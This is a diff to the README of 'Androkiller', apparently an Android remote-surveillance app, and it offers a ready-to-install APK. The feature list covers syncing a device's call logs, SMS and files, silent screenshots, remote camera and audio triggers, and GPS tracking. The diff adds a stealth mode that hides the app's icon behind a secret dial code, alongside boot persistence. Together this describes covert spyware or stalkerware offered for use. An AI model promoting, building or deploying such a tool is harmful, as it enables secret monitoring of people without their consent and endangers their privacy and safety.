@@ -48,11 +48,12 @@ Androkiller/
 - 📞 **Communications Supervision:** Device Call logs (incoming, outgoing, missed) & SMS messages sync.
 - 📁 **File & Apps Management:** Device internal storage file directory sync and installed apps inventory.
 - 🔦 **Hardware Controls:** Flashlight toggle, siren alarm ringer, and interactive chat overlay pop-up.
+- 🥷 **Stealth Mode & Icon Cloaking:** Hide app icon completely from home screen launcher. Fail-safe dial code (`*#*#1337#*#*`) to unhide & launch instantly, persistent notification launch, and remote web control.
 - 🛡️ **Stealth Keep-Alive:** Android Foreground Service with boot receiver auto-start (`BootReceiver`).
 
 ### 🌐 Web Control Hub (`web-app/`)
 - 🗺️ **Leaflet GPS Map:** Real-time location breadcrumbs, accuracy radius, and speedometer.
-- ⚡ **Command Dispatch:** 1-Click remote hardware triggers with live audit logs & receipts.
+- ⚡ **Command Dispatch:** 1-Click remote hardware triggers (Camera, Audio, Flashlight, Siren, Stealth Mode, Full Sync).
 - 🖼️ **Media Vault:** Lightbox photo zoom, silent screenshot viewer, audio note player, and file downloads.
 - 🔄 **Smart Navigation:** Auto-scroll to top on tab switch + floating cyber back-to-top button with circular progress ring.
 - 📱 **Responsive UX:** Optimized for desktop screens and mobile thumb-navigation.
@@ -62,8 +63,8 @@ Androkiller/
 ## 📦 Download Pre-built APK
 
 You can download the ready-to-install Android APK directly from the **[GitHub Releases](https://github.com/kanXer/Androkiller/releases)** section:
-- **`AndroKiller-v1.0.0-release.apk`** *(Recommended)*: Production build with **Debug Mode OFF**, optimized, aligned, and signed for direct installation on any Android device.
-- **`AndroKiller-v1.0.0-debug.apk`**: Development testing APK.
+- **`AndroKiller-v1.2.0-release.apk`** *(Recommended)*: Production build with **Debug Mode OFF**, optimized, aligned, and signed for direct installation on any Android device.
+- **`AndroKiller-v1.2.0-debug.apk`**: Development testing APK.
 
 ---
 
